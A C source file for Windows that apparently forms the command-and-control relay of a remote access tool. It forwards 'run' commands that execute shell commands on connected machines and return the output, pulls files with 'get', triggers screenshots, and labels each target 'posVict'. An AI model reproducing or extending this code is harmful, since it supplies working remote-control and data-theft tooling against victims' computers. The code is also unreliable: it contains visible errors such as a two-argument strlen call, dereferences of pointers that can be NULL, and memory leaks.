#include <winsock2.h>

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "client.h"
#include "extract.h"
#include "sendMessage.h"
#include "ReadFile.h"
#include "Log.h"
#include "SCREENSHOT.h"

extern Client clients[100];
extern int clientscount;
extern CRITICAL_SECTION clientsLock;

//int commandHelper(char* tmp, char* posVict, char* command, char* result) {
//
//}

int handleCommands(
    SOCKET clientSocket,
    char* username,
    char* buffer)
{
    char* extractedBuffer = extractBuffer(buffer);

    if (extractedBuffer == NULL)
        return 0;

    if (strcmp(extractedBuffer, "GETCLIENTS") == 0)
    {
        char response[4096] = "[SUCCESS] CLIENTLIST";

        EnterCriticalSection(&clientsLock);

        for (int i = 0; i < clientscount; i++) {
            strcat_s(response, sizeof(response), " ");
            strcat_s(response, sizeof(response), clients[i].username);
        }

        LeaveCriticalSection(&clientsLock);

        sendMessage(clientSocket, response, strlen(response));

        free(extractedBuffer);
        return 1;
    }

    char* posCom = extractFirstPart(extractedBuffer);

    if (posCom == NULL) {
        free(posCom);
        return 0;
    }

    if (strcmp(posCom, "SCREENSHOT") == 0) {
        char* opp = extractBuffer(extractedBuffer);

        if (opp == NULL) {                
            free(posCom);
            free(extractedBuffer);
            return 1;
        }

        if (strlen("SERVER_LISTENER", opp) == 0) {
            takeScreenshotPixels(1920, 1080);
        }
        else {

            Client *user = findUser(opp);
            if (user == NULL) {
                sendMessage(clientSocket, "USER NOT FOUND.", sizeof("USER NOT FOUND."));
            }

            sendMessage(user->socket, "SV1N_SCREENSHOT", sizeof("SV1N_SCREENSHOT"));
        }
    }

    if (strcmp(posCom, "get") == 0) {
        char* tmp = extractBuffer(extractedBuffer);

        if (tmp != NULL) {
            char* posVict = extractFirstPart(tmp);
            if (posVict != NULL) {
                if (strcmp(posVict, "SERVER_LISTENER") == 0) {
                    char* filename = extractBuffer(tmp);

                    if (filename != NULL) {
                        // lOGIC

                        int res = sendFile(clientSocket, filename, "SERVER_LISTENER");

                        //printf("DEBUG: SENDING FILENAME %s", filename);

                        if (res == 1) {
                            sendMessage(clientSocket, "[ERROR] Failed to transport a file.", sizeof("[ERROR] Failed to transport a file."));
                            free(tmp);
                            free(posVict);
                            free(filename);
                            free(extractedBuffer);
                            return 1;
                        }

                    }
                }
                else {
                    Client* user = findUser(posVict);

                    if (user == NULL) {
                        sendMessage(clientSocket, "[ERROR] USER NOT FOUND", sizeof("[ERROR] USER NOT FOUND"));
                        free(tmp);
                        free(posVict);
                        free(extractedBuffer);
                        return 1;
                    }
                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char answer[1024] = "-get ";

                        strcat_s(answer, sizeof(answer), username);
                        strcat_s(answer, sizeof(answer), " ");
                        strcat_s(answer, sizeof(answer), command);

                        sendMessage(user->socket, answer, strlen(answer));
                        free(command);
                    }
                }
            }
        }

        return 0;
    }


    if (strcmp(posCom, "run") == 0)
    {
        char* tmp = extractBuffer(extractedBuffer);
        
        if (tmp != NULL)
        {
            char* posVict = extractFirstPart(tmp);

            if (posVict != NULL)
            {
                if (strcmp(posVict, "SERVER_LISTENER") == 0)
                {
                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char* result = execCommand(command);

                        if (result != NULL) {
                            sendMessage(clientSocket, result, strlen(result));
                        }

                        free(result);
                        free(command);
                    }
                }
                else
                {

                    Client *user = findUser(posVict);

                    if (user == NULL) {
                        sendMessage(clientSocket, "[ERROR] USER NOT FOUND", sizeof("[ERROR] USER NOT FOUND"));
                        free(tmp);
                        free(posVict);
                        free(extractedBuffer);
                        return 1;
                    }

                    char* command = extractBuffer(tmp);

                    if (command != NULL)
                    {
                        char answer[1024] = "-run ";

                        strcat_s(answer, sizeof(answer), username);
                        strcat_s(answer, sizeof(answer), " ");
                        strcat_s(answer, sizeof(answer), command);

                        sendMessage(user->socket, answer, strlen(answer));
                        free(command);
                    }
                }
                free(posVict);
            }
            free(tmp);
        }
        free(posCom);
        free(extractedBuffer);
        return 1;
    }
    free(posCom);
    free(extractedBuffer);
    return 0;
}


//Client Handle Function

int clientHandleFunc(SOCKET clientSocket, char* username, char* buffer, HANDLE hConsole)
{
    char* posCom = extractFirstPart(buffer);

    if (posCom == NULL) {
        free(posCom);
        return 0;
    }


    if (strcmp(posCom, "-get") == 0) {

        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* posOpp = extractFirstPart(tmp);
        char* filename = extractBuffer(tmp);

        if (posOpp != NULL && filename != NULL) {

            int res = sendFile(clientSocket, filename, posOpp);

            if (res == 1) {
                sendMessage(
                    clientSocket,
                    "[ERROR] Failed to transport a file.",
                    sizeof("[ERROR] Failed to transport a file.")
                );
            }
        }

        free(filename);
        free(posOpp);
        free(tmp);
        free(posCom);

        return 1;
    }


    if (strcmp(posCom, "SV1N_FILE_SEND1NG") == 0)
    {
        char* tmp = extractBuffer(buffer);

        if (tmp == NULL)
        {
            free(posCom);
            return 1;
        }

        //printf("DEBUG: COMMAND %s", tmp);

        // Find the last space (separator before fileSize)
        char* separator = strrchr(tmp, ' ');

        if (separator == NULL)
        {
            free(tmp);
            free(posCom);
            return 1;
        }

        // Extract fileSize
        char* endptr;
        long fileSize = strtol(separator + 1, &endptr, 10);

        if (endptr == separator + 1 || *endptr != '\0' || fileSize < 0)
        {
            free(tmp);
            free(posCom);
            return 1;
        }
        //printf("DEBUG: FILESIZE %ld\n", fileSize);

        // Terminate string before fileSize
        *separator = '\0';

        // Everything before fileSize is filename
        char* filename = tmp;

        //printf("DEBUG: FILENAME %s", filename);

        FILE* file = fopen(filename, "wb");

        if (file == NULL)
        {
            free(tmp);
            free(posCom);
            return 1;
        }

        char infoMessage[512];

        snprintf(infoMessage, sizeof(infoMessage), "[INFO] Receiving file %s (%ld bytes)", filename, fileSize);

        logInfo(infoMessage, hConsole);

        recvFile(
            clientSocket,
            file,
            fileSize
        );

        char message[512];

        snprintf(
            message,
            sizeof(message),
            "[SUCCESS] File %s received",
            filename
        );

        logSuccess(message, hConsole);

        free(tmp);
        free(posCom);

        return 1;
    }



    if (strcmp(posCom, "-run") == 0) {

        char* tmp = extractBuffer(buffer);

        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* posOpp = extractFirstPart(tmp);
        char* command = extractBuffer(tmp);

        if (posOpp != NULL && command != NULL) {

            const char* comresult = NULL;

            comresult = execCommand(command);

            if (comresult == NULL) {
                free(command);
                free(posOpp);
                free(tmp);
                free(posCom);
                return 1;
            }

            size_t responseLength =
                strlen("SV1N_RUN_RESULT") +
                1 +
                strlen(posOpp) +
                1 +
                strlen(comresult);

            char* result = malloc(responseLength + 1);

            if (result != NULL) {
                snprintf(
                    result,
                    responseLength + 1,
                    "SV1N_RUN_RESULT %s %s",
                    posOpp,
                    comresult
                );

                sendMessage(clientSocket, result, responseLength);

                free(result);
            }
        }

    free(command);
    free(posOpp);
    free(tmp);
    free(posCom);

    return 1;
    }
    return 0;
}

//SERVER_RETRANSLATOR

int SERVER_RETRANSLATOR(char* buffer, SOCKET clientSocket) {
    char* posCom = extractFirstPart(buffer);
    if (posCom == NULL) {
        return 0;
    }

    if (strcmp(posCom, "SV1N_FILE_SEND1NG") == 0)
    {
        char* tmp = extractBuffer(buffer);
        if (tmp == NULL)
        {
            free(posCom);
            return 1;
        }

        char* target = extractFirstPart(tmp);
        if (target == NULL)
        {
            free(tmp);
            free(posCom);
            return 1;
        }

        Client* user = findUser(target);

        if (user == NULL) {
            sendMessage(clientSocket, "[ERROR] USER NOT FOUND.", sizeof("[ERROR] USER NOT FOUND."));
            free(tmp);
            free(posCom);
            return 1;
        }

            char* rest = extractBuffer(tmp);

            if (rest != NULL)
            {
                long fileSize = 0;

                char* filename = extractFirstPart(rest);

                if (filename != NULL)
                {
                    char* sizeStr = extractBuffer(rest);

                    if (sizeStr != NULL)
                    {
                        fileSize = atol(sizeStr);

                        char header[512];

                        sprintf_s(
                            header,
                            sizeof(header),
                            "SV1N_FILE_SEND1NG %s %ld",
                            filename,
                            fileSize
                        );

                        printf("HEADER: %s", header);

                        sendMessage(
                            user->socket,
                            header,
                            strlen(header)
                        );

                        char chunk[64000];

                        long remaining = fileSize;

                        while (remaining > 0)
                        {
                            int toRead =
                                remaining > sizeof(chunk)
                                ? sizeof(chunk)
                                : (int)remaining;

                            int bytesReceived =
                                recv(
                                    clientSocket,
                                    chunk,
                                    toRead,
                                    0
                                );

                            if (bytesReceived <= 0)
                                break;

                            if (sendAll(
                                user->socket,
                                chunk,
                                bytesReceived
                            ) == SOCKET_ERROR)
                            {
                                break;
                            }

                            remaining -= bytesReceived;
                        }

                        free(sizeStr);
                    }

                    free(filename);
                }

                free(rest);
            }

        free(target);
        free(tmp);
        free(posCom);

        return 1;
    }

    if (strcmp(posCom, "SV1N_RUN_RESULT") == 0) {
        char* tmp = extractBuffer(buffer);
        if (tmp == NULL) {
            free(posCom);
            return 1;
        }

        char* opp = extractFirstPart(tmp);

        if (opp == NULL) {
            free(tmp);
            free(posCom);
            return 1;
        }

        Client* user = findUser(opp);

        if (strcmp(user->username, opp) == 0) {
            char* result = extractBuffer(tmp);

            if (result == NULL) {
                free(tmp);
                free(opp);
                free(posCom);
                return 1;
            }

            sendMessage(user->socket, result, strlen(result));
            free(result);
        }


        free(tmp);
        free(opp);
        free(posCom);
        return 1;
    }

    free(posCom);
    return 0;
}